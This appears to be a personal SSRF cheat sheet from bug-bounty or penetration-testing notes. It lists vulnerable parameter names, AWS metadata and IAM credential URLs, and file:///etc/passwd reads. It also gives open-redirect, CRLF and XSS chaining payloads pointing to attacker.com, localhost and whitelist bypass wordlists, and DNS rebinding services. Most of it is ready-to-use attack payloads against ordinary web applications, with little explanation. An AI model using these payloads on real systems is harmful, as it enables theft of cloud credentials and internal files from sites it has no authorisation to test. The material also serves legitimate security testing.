# SSRF

payload : `www.attacker.com/?`    <-- https://hackerone.com/reports/2442626

Use [[Certbot]] to make our http server to https to allow target website to ping our attacker hosted website.

SSRF via SVG file upload

Spider a domain in burpsuite. Payloads are at down
Search for `url=` `request=` `load=` `redirect=` `fetch=` `page=` `site=` `open=` `entry=` `target=` `Destination=` `Uri=` `file=`

### Blind SSRF

X-Forwarded-Host, X-Forwarded-For, X-HOST etc,

Add this header in the request followed by our attacker URL. 

it will send cookies, internal requests, IP. To our server.

SVG to SSRF `https://github.com/allanlw/svg-cheatsheet`

### AWS Meta Data Service 
SSRF -> AWS Metadata Service
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
`<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
`<img src="file:///etc/passwd">`

```
http:// 169.254.169.254/latest/meta—data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta—data/iam/security-credentials/IAM_USER_ROLE_HERE
http://169.254.169.254/latest/meta-data/iam/security-credentialsl/PhotonInstance
```

SSRF to Accessing Cloud Meta Data 

https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

##### SSRF to LFI 

`file://etc/passwd`

Double Encode URL to avoid black listing ()

---
### URL Schemes to Check 

```
file://
dict://
sftp://
ldap://
ldaps://
ldapi://
tfpt://
gopher://
```

## Payloads

```
?dest={target} 
?redirect={target} 
?uri={target} 
?path={target} 
?continue={target} 
?url={target} 
?window={target} 
?next={target} 
?data={target} 
?reference={target} 
?site={target}
?html={target} 
?val={target} 
?validate={target} 
?domain={target} 
?callback={target} 
?return={target} 
?page={target} 
?feed={target} 
?host={target} 
?port={target} 
?to={target} 
?out={target} 
?view={target} 
?dir={target}
```

## SSRF Chaining

### Open redirect to SSRF 
find a file via bruteforce the URL parameter  chain with open redirect
```
example.com/ssrf.php?url=/redirect.php?url=//attacker.com
```

### SSRF to CRLF:
```
example.com/ssrf.php?url=/test%0d%0aHost:%20attacker.com
```

### SSRF to XSS

Host a file in attacker server or any where publicly, give that to make an XSS. (the file will contain XSS payload).

### SSRF to FFMPEG

if any Video upload functionality is there in the website we can exploit this.

https://github.com/neex/ffmpeg-avi-m3u-xbin

`./gen_xbin_avi.py file://<filename> file_read.avi`

### XSS + Open Redirect --> SSRF (internal access)

(this will more work in pdf generator feature)
From XSS `<iframe src=//attacker.com/test.php>` this won't work because of SOP. where `test.php` have  `<?php header('Location:file:///etc/passwd'); ?>`.

And if we found an Open redirect in the same, we can chain it with that XSS that can ping our attacker server.
`target.com/api/logout"redirTo=//attacker.com`  can be our open redirect

we can craft our XSS payload with `<iframe src=/api/logout?redirTo=//attacker.com/test.php></iframe>`. Now server renders iframe of its own origin gets redirect to attacker server which redirects to `file://etc/passwd`. 

### Whitelist bypass

If the server puts a whitelist for URLs give a `?` at the end of whitelist URL followed by attacker URL. `url=http://attacker.com?.target.com/` This will bypass if they set `http://*.target`. That **?** will break the whitelist and pings to attacker.com

## Bypassing restrictions from SSRF

localhost bypass wordlist
```
https://127.0.0.1/
https://localhost/
http://[::]:80/
http://[::]:25/ 
http://[::]:22/ 
http://[::]:3128/ 
http://[0000::1]:80/
http://[0000::1]:25/ 
http://[0000::1]:22/ 
http://[0000::1]:3128/ 
localtest.me	
localh.st	
spoofed.redacted.oastify.com
company.127.0.0.1.nip.io
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://2130706433/
http://3232235521/
http://3232235777/
http://2852039166/
http://0177.0.0.1/
http://o177.0.0.1/
http://0o177.0.0.1/
http://q177.0.0.1/
http://0/
http://127.1
http://127.0.1
http://① ② ⑦.⓿.⓿.①
```

Bypass using enclosed alphanumerics
https://qaz.wtf/u/convert.cgi

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

#### DNS Rebinding

Application code has check for user input data and process if and only domain/IP is not black listed. We will bypass the blacklist with DNS rebinding.

The server will request to the DNS for the IP and it might get cached. So the rebinding host contains 2 DNS records with less TTL. so when we request for that URL multiple times some times it will point to the blacklisted IP(AWS/Localhost). Thus we bypassed the blacklist.

**Approach:** give an IP which is attacker controlled or any public which is allowed and other one is blacklisted (AWS/localhost) and generate such URL with below links.

https://lock.cmpxchg8b.com/rebinder.html
http://1u.ms/

http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms

https://canarytokens.org/nest/


## From Wayback urls

```
cat all-inscope-domains.txt | waybackurls -dates | grep "https://" | grep "url=" | egrep -v "(.txt|.js|.svg|.jpeg|.jpg|.woff|.woff2|.eot|.css|.png|.ttf|.gif)
```